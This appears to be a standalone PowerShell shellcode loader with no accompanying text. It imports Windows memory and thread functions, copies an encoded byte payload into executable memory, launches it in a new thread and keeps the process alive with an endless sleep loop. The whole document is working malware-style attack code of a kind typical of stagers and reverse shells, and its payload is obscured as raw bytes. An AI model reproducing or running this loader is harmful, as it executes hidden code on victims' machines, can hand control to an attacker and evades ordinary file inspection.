$02y = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $02y -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x61,0x61,0x4d,0xd1,0xda,0xd1,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x31,0x77,0x13,0x83,0xef,0xfc,0x03,0x77,0x6e,0x83,0xb8,0x2d,0x98,0xc1,0x43,0xce,0x58,0xa6,0xca,0x2b,0x69,0xe6,0xa9,0x38,0xd9,0xd6,0xba,0x6d,0xd5,0x9d,0xef,0x85,0x6e,0xd3,0x27,0xa9,0xc7,0x5e,0x1e,0x84,0xd8,0xf3,0x62,0x87,0x5a,0x0e,0xb7,0x67,0x63,0xc1,0xca,0x66,0xa4,0x3c,0x26,0x3a,0x7d,0x4a,0x95,0xab,0x0a,0x06,0x26,0x47,0x40,0x86,0x2e,0xb4,0x10,0xa9,0x1f,0x6b,0x2b,0xf0,0xbf,0x8d,0xf8,0x88,0x89,0x95,0x1d,0xb4,0x40,0x2d,0xd5,0x42,0x53,0xe7,0x24,0xaa,0xf8,0xc6,0x89,0x59,0x00,0x0e,0x2d,0x82,0x77,0x66,0x4e,0x3f,0x80,0xbd,0x2d,0x9b,0x05,0x26,0x95,0x68,0xbd,0x82,0x24,0xbc,0x58,0x40,0x2a,0x09,0x2e,0x0e,0x2e,0x8c,0xe3,0x24,0x4a,0x05,0x02,0xeb,0xdb,0x5d,0x21,0x2f,0x80,0x06,0x48,0x76,0x6c,0xe8,0x75,0x68,0xcf,0x55,0xd0,0xe2,0xfd,0x82,0x69,0xa9,0x69,0x66,0x40,0x52,0x69,0xe0,0xd3,0x21,0x5b,0xaf,0x4f,0xae,0xd7,0x38,0x56,0x29,0x18,0x13,0x2e,0xa5,0xe7,0x9c,0x4f,0xef,0x23,0xc8,0x1f,0x87,0x82,0x71,0xf4,0x57,0x2b,0xa4,0x61,0x5d,0xbb,0x2e,0x13,0x32,0x91,0xd9,0xd9,0xcc,0xfd,0xc7,0x57,0x2a,0xad,0xa7,0x37,0xe3,0x0d,0x18,0xf8,0x53,0xe5,0x72,0xf7,0x8c,0x15,0x7d,0xdd,0xa4,0xbf,0x92,0x88,0x9d,0x57,0x0a,0x91,0x56,0xc6,0xd3,0x0f,0x13,0xc8,0x58,0xbc,0xe3,0x86,0xa8,0xc9,0xf7,0x7e,0x59,0x84,0xaa,0x28,0x66,0x32,0xc0,0xd4,0xf2,0xb9,0x43,0x83,0x6a,0xc0,0xb2,0xe3,0x34,0x3b,0x91,0x78,0xfc,0xa9,0x5a,0x16,0x01,0x3e,0x5b,0xe6,0x57,0x54,0x5b,0x8e,0x0f,0x0c,0x08,0xab,0x4f,0x99,0x3c,0x60,0xda,0x22,0x15,0xd5,0x4d,0x4b,0x9b,0x00,0xb9,0xd4,0x64,0x67,0x3b,0x28,0xb3,0x41,0x49,0x40,0x07;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ffz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ffz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ffz,0,0,0);for (;;){Start-sleep 60};